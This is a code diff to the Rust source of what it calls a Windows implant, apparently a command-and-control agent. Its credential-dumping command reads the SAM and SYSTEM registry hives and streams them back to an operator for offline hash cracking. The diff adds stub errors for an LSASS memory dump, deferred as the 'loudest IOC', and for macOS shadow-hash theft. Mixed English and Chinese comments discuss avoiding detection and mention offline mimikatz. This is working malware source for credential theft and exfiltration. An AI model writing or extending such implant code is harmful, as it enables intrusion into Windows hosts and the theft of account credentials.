@@ -1,6 +1,6 @@
 //! Credential extraction (Hashdump) for the Windows PIC implant.
 //!
-//! Implements `Command::Hashdump { method }`:
+//! Implements `Command::Hashdump { method }` (method 语义跨后端统一约定):
 //!   - method 0: read the raw SAM registry hive (`\SystemRoot\System32\config\SAM`)
 //!     plus the matching SYSTEM hive (needed to derive the boot key), and
 //!     stream both back as `FileChunk`s. The hives are encrypted at rest; the
@@ -9,6 +9,9 @@
 //!     the full Python toolchain and isn't burning implant time on a multi-step
 //!     crypto dance that also balloons the binary.
 //!   - method 1: read the on-disk SYSTEM hive (the boot-key source) on its own.
+//!   - method 2: LSASS memory dump — explicitly deferred (louddest IOC); returns
+//!     an honest "deferred" Err so the operator isn't left guessing.
+//!   - method 3: macOS shadow hash — Windows 返回 unsupported（agent-dev 才支持）。
 //!
 //! LSASS memory dumping (`procdump`-style mini-dump of lsass.exe then offline
 //! mimikatz) is a separate, much riskier path (needs SeDebugPrivilege + a handle
@@ -164,6 +167,19 @@ pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
             let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
             let mut sys_chunks = unsafe { stream_file(rt, &sys, "SYSTEM") };
             out.append(&mut sys_chunks);
+        }
+        2 => {
+            // LSASS memory dump: deferred (loudest credential IOC). Honest Err
+            // rather than silence — operator gets a clear "not implemented".
+            return Response::Err(String::from(
+                "hashdump lsass: deferred (loudest IOC). Use method=0 SAM + method=1 SYSTEM, decrypt offline.",
+            ));
+        }
+        3 => {
+            // macOS shadow hash — Windows beacon doesn't support it.
+            return Response::Err(String::from(
+                "hashdump shadow: macOS-only (use the dev agent). On Windows use method=0 sam / method=1 system.",
+            ));
         }
         other => {
             return Response::Err({
